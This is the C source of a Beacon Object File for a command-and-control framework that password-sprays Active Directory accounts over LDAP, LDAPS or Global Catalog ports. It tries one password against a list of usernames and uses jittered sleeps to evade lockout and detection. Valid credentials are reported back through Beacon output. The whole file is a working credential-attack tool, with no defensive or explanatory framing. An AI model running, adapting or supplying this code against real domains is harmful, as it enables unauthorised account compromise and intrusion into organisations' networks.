#include <windows.h>
#include <winldap.h>
#include <winber.h>
#include <stdio.h>
#include "beacon.h"
#include "passwordsprayad.h"

#pragma comment(lib, "wldap32.lib")

//START TrustedSec BOF print code
#ifndef bufsize
#define bufsize 8192
#endif
char *output = 0;  
WORD currentoutsize = 0;
HANDLE trash = NULL; 
int bofstart();
void internal_printf(const char* format, ...);
void printoutput(BOOL done);

int bofstart() {   
    output = (char*)MSVCRT$calloc(bufsize, 1);
    currentoutsize = 0;
    return 1;
}

void internal_printf(const char* format, ...){
    int buffersize = 0;
    int transfersize = 0;
    char * curloc = NULL;
    char* intBuffer = NULL;
    va_list args;
    va_start(args, format);
    buffersize = MSVCRT$vsnprintf(NULL, 0, format, args); 
    va_end(args);
    
    if (buffersize == -1) return;
    
    char* transferBuffer = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, bufsize);
	intBuffer = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, buffersize);
    va_start(args, format);
    MSVCRT$vsnprintf(intBuffer, buffersize, format, args); 
    va_end(args);
    if(buffersize + currentoutsize < bufsize) 
    {
        MSVCRT$memcpy(output+currentoutsize, intBuffer, buffersize);
        currentoutsize += buffersize;
    } else {
        curloc = intBuffer;
        while(buffersize > 0)
        {
            transfersize = bufsize - currentoutsize;
            if(buffersize < transfersize) 
            {
                transfersize = buffersize;
            }
            MSVCRT$memcpy(output+currentoutsize, curloc, transfersize);
            currentoutsize += transfersize;
            if(currentoutsize == bufsize)
            {
                printoutput(FALSE); 
            }
            MSVCRT$memset(transferBuffer, 0, transfersize); 
            curloc += transfersize; 
            buffersize -= transfersize;
        }
    }
	KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, intBuffer);
	KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, transferBuffer);
}

void printoutput(BOOL done) {
    BeaconOutput(CALLBACK_OUTPUT, output, currentoutsize);
    currentoutsize = 0;
    MSVCRT$memset(output, 0, bufsize);
    if(done) {MSVCRT$free(output); output=NULL;}
}
//END TrustedSec BOF print code.


void secure_sleep(int base_seconds, int jitter_percent) {
    if (base_seconds <= 0) return;

    int sleep_ms = base_seconds * 1000;
    if (jitter_percent > 0) {
        MSVCRT$srand(KERNEL32$GetTickCount());
        int range = (sleep_ms * jitter_percent) / 100;
        if (range > 0) {
            int jitter = (MSVCRT$rand() % (range * 2)) - range;
            sleep_ms += jitter;
        }
    }
    
    if (sleep_ms > 0) {
        KERNEL32$Sleep(sleep_ms);
    }
}

int authenticate(WCHAR* wDC, int port, BOOL use_ssl, WCHAR* wDomain, WCHAR* wUsername, WCHAR* wPassword) {
    LDAP* ld = NULL;
    ULONG version = LDAP_VERSION3;
    ULONG ldap_err;
    
    ld = WLDAP32$ldap_initW(wDC, port);
    if (ld == NULL) return -1;

    WLDAP32$ldap_set_optionW(ld, LDAP_OPT_PROTOCOL_VERSION, &version);
    
    if (use_ssl) {
        ULONG ssl_on = LDAP_OPT_ON;
        WLDAP32$ldap_set_optionW(ld, LDAP_OPT_SSL, &ssl_on);
    }

    ldap_err = WLDAP32$ldap_connect(ld, NULL);
    if (ldap_err != LDAP_SUCCESS) {
        WLDAP32$ldap_unbind(ld);
        return -2;
    }

    WCHAR fullUsername[512];
    MSVCRT$_snwprintf(fullUsername, 512, L"%s@%s", wUsername, wDomain);

    ldap_err = WLDAP32$ldap_simple_bind_sW(ld, fullUsername, wPassword);
    WLDAP32$ldap_unbind(ld);

    if (ldap_err == LDAP_SUCCESS) return 1;          
    if (ldap_err == LDAP_INVALID_CREDENTIALS) return 0; 
    return -3; 
}

int go(char *args, int len) {
    WCHAR *wPassword, *wDomain, *wDC;
    char *protocol_str;
    int sleepDuration, jitterPercent, iBytesLen;
    int count = 0;
    int success_count = 0;
    CHAR* usernameFileBytes;
    datap parser;

    BeaconDataParse(&parser, args, len);
    usernameFileBytes = BeaconDataExtract(&parser, &iBytesLen);
    wPassword = (WCHAR*)BeaconDataExtract(&parser, NULL);
    wDomain = (WCHAR*)BeaconDataExtract(&parser, NULL);
    wDC = (WCHAR*)BeaconDataExtract(&parser, NULL);
    protocol_str = BeaconDataExtract(&parser, NULL); 
    sleepDuration = BeaconDataInt(&parser);
    jitterPercent = BeaconDataInt(&parser);

    if (iBytesLen == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Username list is empty.");
        return -1;
    }

    if (!bofstart()) return -1;

    // Port and SSL logic updated for GC/GCS
    BOOL use_ssl = (MSVCRT$strcmp(protocol_str, "ldaps") == 0 || MSVCRT$strcmp(protocol_str, "gcs") == 0);
    int port;
    if (MSVCRT$strcmp(protocol_str, "gc") == 0) {
        port = 3268;
    } else if (MSVCRT$strcmp(protocol_str, "gcs") == 0) {
        port = 3269;
    } else {
        port = use_ssl ? 636 : 389;
    }

    internal_printf("[*] Starting spray against DC: %S (%s - Port: %d)\n", wDC, protocol_str, port);
	internal_printf("====================================================================================\n\n");

    char* username = MSVCRT$strtok(usernameFileBytes, "\r\n");
    while (username != NULL) {
        WCHAR wUsername[MAX_PATH];
        KERNEL32$MultiByteToWideChar(CP_ACP, 0, username, -1, wUsername, MAX_PATH);

        int result = authenticate(wDC, port, use_ssl, wDomain, wUsername, wPassword);

        if (result == 1) {
            internal_printf("[+] VALID: %S\\%S\n", wDomain, wUsername);
            success_count++;
        } else if (result == -2 || result == -1) {
            internal_printf("[-] Connection error to %S on port %d\n", wDC, port);
            break; 
        }

        count++;
        username = MSVCRT$strtok(NULL, "\r\n");
        
        if (username != NULL) {
            secure_sleep(sleepDuration, jitterPercent);
        }
    }

    printoutput(TRUE);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Spray complete. Tested: %d, Hits: %d\n", count, success_count); 
    
    return 0;
}